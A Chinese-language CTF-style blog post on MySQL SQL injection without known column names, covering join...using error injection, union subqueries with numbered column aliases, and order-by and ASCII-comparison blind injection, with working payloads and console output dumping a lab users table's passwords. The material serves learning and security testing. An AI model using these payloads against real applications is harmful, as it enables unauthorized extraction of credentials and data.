---
title: "MySQL 无列名注入的几种方式"
date: 2022-08-29T12:35:10+08:00
lastmod: 2022-08-29T12:35:10+08:00
draft: false
author: "X1r0z"

tags: ['mysql','sqli','ctf']
categories: ['web']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

总结一下无列名注入的几种方式

<!--more-->

## join...using

利用条件: 能显示报错信息

payload 如下

```sql
select * from (select * from users a join users b)c;
```

原理是用 join 连接两张表时, 遇到重复的列名会报错, 并把这个报错的列名显示出来

```sql
mysql> select * from (select * from users a join users b)c;
ERROR 1060 (42S21): Duplicate column name 'id'
mysql> select * from (select * from users a join users b using(id))c;
ERROR 1060 (42S21): Duplicate column name 'username'
mysql> select * from (select * from users a join users b using(id,username))c;
ERROR 1060 (42S21): Duplicate column name 'password'
```

通过 using 可以声明连接时的关联条件, 类似于平常写 inner join 时候的 `on a.id = b.id`, 这样就可以避免该字段重复而报错

这里设置别名的时候省略了 `as`, 完整的写法如下

```sql
select * from (select * from users as a join users as b) as c
```

join 在连接不同表时不需要别名, 因为两张表本身就不一样, 但是我们把 users 自身连接起来时需要设置别名以对两张表进行区分, 否则会报错 `ERROR 1066 (42000): Not unique table/alias: 'users'`

括号后面的 c 是括号里面子查询返回的表的别名, 不加的话会显示 `ERROR 1248 (42000): Every derived table must have its own alias`

放到注入点里面的几种形式

union 第一种

```sql
mysql> select * from emails where id=1;
+----+------------------+
| id | email_id         |
+----+------------------+
|  1 | Dumb@dhakkan.com |
+----+------------------+
1 row in set (0.00 sec)

mysql> select * from emails where id=1 union select * from (select * from users a join users b)c;
ERROR 1060 (42S21): Duplicate column name 'id'
mysql> select * from emails where id=1 union select * from (select * from users a join users b using(id))c;
ERROR 1060 (42S21): Duplicate column name 'username'
```

union 第二种, 需要知道字段数

```sql
mysql> select * from emails where id=1 union select 1,(select * from (select * from users a join users b)c);
ERROR 1060 (42S21): Duplicate column name 'id'
mysql> select * from emails where id=1 union select 1,(select * from (select * from users a join users b using(id))c);
ERROR 1060 (42S21): Duplicate column name 'username'
```

直接用 and 连接, 不使用 union

```sql
mysql> select * from emails where id=1 and (select * from (select * from users a join users b)c);
ERROR 1060 (42S21): Duplicate column name 'id'
mysql> select * from emails where id=1 and (select * from (select * from users a join users b using(id))c);
ERROR 1060 (42S21): Duplicate column name 'username'
```

因为是报错注入, 语句很灵活, 也可以塞进 updatexml extractvalue 里面, 不过利用思路都是差不多的

## 子查询

利用条件: union 未被过滤

payload 如下

```sql
select `3` from (select 1,2,3 union select * from users)c;
```

这种方法的原理也很简单, 首先通过 union 将查询结果连接

```sql
mysql> select 1,2,3 union select * from users;
+----+----------+------------+
| 1  | 2        | 3          |
+----+----------+------------+
|  1 | 2        | 3          |
|  1 | Dumb     | Dumb       |
|  2 | Angelina | I-kill-you |
|  3 | Dummy    | p@ssword   |
|  4 | secure   | crappy     |
|  5 | stupid   | stupidity  |
|  6 | superman | genious    |
|  7 | batman   | mob!le     |
|  8 | admin    | admin      |
|  9 | admin1   | admin1     |
| 10 | admin2   | admin2     |
| 11 | admin3   | admin3     |
| 12 | dhakkan  | dumbo      |
| 14 | admin4   | admin4     |
+----+----------+------------+
14 rows in set (0.00 sec)
```

注意顶部的字段名全部都变成了 1,2,3, 我们可以单独把前半句拿出来看一看

```sql
mysql> select 1,2,3;
+---+---+---+
| 1 | 2 | 3 |
+---+---+---+
| 1 | 2 | 3 |
+---+---+---+
1 row in set (0.00 sec)
```

在这种单纯 select 已知字符 (数字, 字母, 特殊符号) 的情况下, mysql 会自动把列名设置成我们查询的字符

之后通过 union 连接, 因为连接顺序的问题, 在 union 后面的查询结果中的字段名会和 union 前的查询结果保持一致, 这里就相当于我们用了 1 2 3 替换掉了原来的 id username password

最后通过反引号来引用这个列名

```sql
mysql> select `3` from (select 1,2,3 union select * from users)c;
+------------+
| 3          |
+------------+
| 3          |
| Dumb       |
| I-kill-you |
| p@ssword   |
| crappy     |
| stupidity  |
| genious    |
| mob!le     |
| admin      |
| admin1     |
| admin2     |
| admin3     |
| dumbo      |
| admin4     |
+------------+
14 rows in set (0.00 sec)
```

反引号的作用就是区分 mysql 的保留字和普通字符, 也可以区分普通的字符串 1 2 3 和列名 1 2 3

不加反引号的话 mysql 会认为我们只是查询 3 这个字符串, 而不会引用表里面列名为 3 的内容

```sql
mysql> select 3 from (select 1,2,3 union select * from users)c;
+---+
| 3 |
+---+
| 3 |
| 3 |
| 3 |
| 3 |
| 3 |
| 3 |
| 3 |
| 3 |
| 3 |
| 3 |
| 3 |
| 3 |
| 3 |
| 3 |
+---+
14 rows in set (0.00 sec)
```

如果过滤了反引号的话, 还可以通过别名或者引号来绕过

别名 第一种方式 (字段别名)

```sql
select a from (select 1,2,3 a union select * from users)c;
```

别名 第二种方式 (子查询 别名)

```sql
select c.3 from (select 1,2,3 union select * from users)c;
```

引号

```sql
mysql> select mycolumn from (select 1,2,"mycolumn" union select * from users)c;
```

引号的作用就类似于我们为这一列单独设置了一个列名, 然后在最开头的 select 查询该列名来返回数据

放在 sql 注入里的形式

```sql
mysql> select * from emails where id=1 union select 1,`3` from (select 1,2,3 union select * from users)c;
+----+------------------+
| id | email_id         |
+----+------------------+
|  1 | Dumb@dhakkan.com |
|  1 | 3                |
|  1 | Dumb             |
|  1 | I-kill-you       |
|  1 | p@ssword         |
|  1 | crappy           |
|  1 | stupidity        |
|  1 | genious          |
|  1 | mob!le           |
|  1 | admin            |
|  1 | admin1           |
|  1 | admin2           |
|  1 | admin3           |
|  1 | dumbo            |
|  1 | admin4           |
+----+------------------+
15 rows in set (0.00 sec)
```

必须要用到 union 连接, 并且需要知道字段数

## order by 盲注

order by 的注入也是属于一个大类里面的, 要讲的内容很多, 这里先简单写一下无列名的 order by 盲注

```sql
mysql> select * from users where id=1 union select 1,2,binary 'D' order by 3;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | 2        | D        |
|  1 | Dumb     | Dumb     |
+----+----------+----------+
2 rows in set (0.00 sec)

mysql> select * from users where id=1 union select 1,2,binary 'Du' order by 3;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | 2        | Du       |
|  1 | Dumb     | Dumb     |
+----+----------+----------+
2 rows in set (0.00 sec)

mysql> select * from users where id=1 union select 1,2,binary 'Dx' order by 3;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | Dumb     | Dumb     |
|  1 | 2        | Dx       |
+----+----------+----------+
2 rows in set (0.00 sec)
mysql> select * from users where id=1 union select 1,2,binary 'Dz' order by 3;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | Dumb     | Dumb     |
|  1 | 2        | Dz       |
+----+----------+----------+
2 rows in set (0.00 sec)
```

前面加上 binary 是为了区分大小写

本质上是利用 order by 按字母顺序排序的特点, 如果我们输入的数据前几位符合 password 的内容, 会优先显示我们的数据, 如果输入的数据不符合的话, 就会显示原本的数据 (也可以加上 asc desc 改一下显示顺序)

但是这种方法好像无法跨表查询 (?) 不知道有没有可行的 payload

## ascii 比较盲注

利用 mysql 比较字符时会转换成 ascii 的特性来进行盲注

原理如下

```sql
mysql> select 'a'>'c';
+---------+
| 'a'>'c' |
+---------+
|       0 |
+---------+
1 row in set (0.00 sec)

mysql> select 'd'>'c';
+---------+
| 'd'>'c' |
+---------+
|       1 |
+---------+
1 row in set (0.00 sec)
```

如果是字符串会按照单个字符依次比较, 我就不写了

payload 如下

```sql
mysql> select * from emails where id=1 and (select 1,binary 'Da',3)>(select * from users limit 0,1);
Empty set (0.00 sec)

mysql> select * from emails where id=1 and (select 1,binary 'D',3)>(select * from users limit 0,1);
Empty set (0.00 sec)

mysql> select * from emails where id=1 and (select 1,binary 'Du',3)>(select * from users limit 0,1);
Empty set (0.00 sec)

mysql> select * from emails where id=1 and (select 1,binary 'Da',3)>(select * from users limit 0,1);
Empty set (0.00 sec)

mysql> select * from emails where id=1 and (select 1,binary 'Dz',3)>(select * from users limit 0,1);
+----+------------------+
| id | email_id         |
+----+------------------+
|  1 | Dumb@dhakkan.com |
+----+------------------+
1 row in set (0.00 sec)
```

不过这种方法也有个缺点, 例如 users 表的列名是 `id username password`, 如果你想要猜 password 的内容, 就必须要先把 id 和 username 猜出来

```sql
(select 1,2,3)>(select * from users limit 0,1); # 第一个位置先猜 id
......

(select 1,'Dumb',3)>(select * from users limit 0,1); # 第二个位置再猜 username
......

(select 1,'Dumb','Dumb')>(select * from users limit 0,1); # 第三个位置才能猜 password
```